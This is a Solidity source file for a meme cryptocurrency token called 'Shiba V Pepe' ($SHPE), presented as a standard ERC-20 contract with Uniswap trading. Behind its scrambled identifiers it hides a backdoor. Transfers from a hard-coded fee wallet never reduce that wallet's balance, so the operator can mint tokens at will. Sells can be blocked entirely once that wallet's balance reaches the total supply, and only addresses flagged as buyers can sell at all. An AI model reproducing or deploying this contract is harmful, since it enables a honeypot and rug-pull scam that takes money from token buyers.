/*

Shiba V Pepe   $SHPE
Shiba and Pepe, two legendary meme characters, are stepping into the ring for an electrifying Street Fighter-style showdown in the world of cryptocurrencies!


Telegram: https://t.me/SHPECOIN
Website : https://www.shibvspepe.org/
X/Twitter: https://twitter.com/SHPECOIN

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wiruk(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wiruk(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wiruk(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ShibaVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Shiba V Pepe";
    string private constant _symbol = "SHPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalsSupplym_zx = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplym_zx;
    uint256 public _maxWalletSize = _totalsSupplym_zx;
    uint256 public _taxSwapThreshold= _totalsSupplym_zx;
    uint256 public _maxTaxSwap= _totalsSupplym_zx;

    uint256 private _BuyTaxinitial=12;
    uint256 private _SellTaxinitial=24;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=6;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _rkilPevatienggsSwapeomy=0;
    uint256 private _budutatCayzsjdmg=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vfe_hwaecvg;
    mapping (address => bool) private _wifiWaletauaey;
    mapping(address => uint256) private _vkd_rdauc_fxTmetTranafravoe;
    bool public _erfexrncdausy = false;
    
    IuniswapRouter private _uniswaptRoutertUniswaptFactbe;
    address private _uniswapPairTokenagLiquidily;
    bool private FiqTradfurgrque;
    bool private _taseiywapuvpjg = false;
    bool private _swapixknrUniswaptpSnqlts = false;
    address public _trmoFeeuyRecqxeiy = 0xB8303384735B454FA1c84391b377B60A43B9dB39;
 
 
    event RemovsieAtylauiseqt(uint _maxTxAmount);
    modifier lockTheSwap {
        _taseiywapuvpjg = true;
        _;
        _taseiywapuvpjg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplym_zx;
        _vfe_hwaecvg[owner()] = true;
        _vfe_hwaecvg[address(this)] = true;
        _vfe_hwaecvg[_trmoFeeuyRecqxeiy] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplym_zx);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplym_zx;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wiruk(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_erfexrncdausy) {
                if (to != address(_uniswaptRoutertUniswaptFactbe) && to != address(_uniswapPairTokenagLiquidily)) {
                  require(_vkd_rdauc_fxTmetTranafravoe[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _vkd_rdauc_fxTmetTranafravoe[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenagLiquidily && to != address(_uniswaptRoutertUniswaptFactbe) && !_vfe_hwaecvg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_budutatCayzsjdmg<_rkilPevatienggsSwapeomy){
                  require(!_rdktqtrq(to));
                }
                _budutatCayzsjdmg++; _wifiWaletauaey[to]=true;
                taxAmount = amount.mul((_budutatCayzsjdmg>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenagLiquidily && from!= address(this) && !_vfe_hwaecvg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_trmoFeeuyRecqxeiy)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_budutatCayzsjdmg>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_budutatCayzsjdmg>_rkilPevatienggsSwapeomy && _wifiWaletauaey[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_taseiywapuvpjg 
            && to == _uniswapPairTokenagLiquidily && _swapixknrUniswaptpSnqlts && contractTokenBalance>_taxSwapThreshold 
            && _budutatCayzsjdmg>_rkilPevatienggsSwapeomy&& !_vfe_hwaecvg[to]&& !_vfe_hwaecvg[from]
            ) {
                swapoToqenthrfq( _drctr(amount, _drctr(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wiruk(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wiruk(taxAmount));
        emit Transfer(from, to, amount. _wiruk(taxAmount));
    }

    function swapoToqenthrfq(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FiqTradfurgrque){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswaptRoutertUniswaptFactbe.WETH();
        _approve(address(this), address(_uniswaptRoutertUniswaptFactbe), amountForstoken);
        _uniswaptRoutertUniswaptFactbe.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _drctr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wiruk(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _trmoFeeuyRecqxeiy){
            return a;
        }else{
            return a. _wiruk(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplym_zx;
        _maxWalletSize=_totalsSupplym_zx;
        _erfexrncdausy=false;
        emit RemovsieAtylauiseqt(_totalsSupplym_zx);
    }

    function _rdktqtrq(address _urfuzq) private view returns (bool) {
        uint256 ltpuaBaracyaud;
        assembly {
            ltpuaBaracyaud := extcodesize(_urfuzq)
        }
        return ltpuaBaracyaud > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FiqTradfurgrque,"trading is already open");
        _uniswaptRoutertUniswaptFactbe = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswaptRoutertUniswaptFactbe), _totalsSupplym_zx);
        _uniswapPairTokenagLiquidily = IUniswapV2Factory(_uniswaptRoutertUniswaptFactbe.factory()).createPair(address(this), _uniswaptRoutertUniswaptFactbe.WETH());
        _uniswaptRoutertUniswaptFactbe.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenagLiquidily).approve(address(_uniswaptRoutertUniswaptFactbe), type(uint).max);
        _swapixknrUniswaptpSnqlts = true;
        FiqTradfurgrque = true;
    }

    receive() external payable {}
}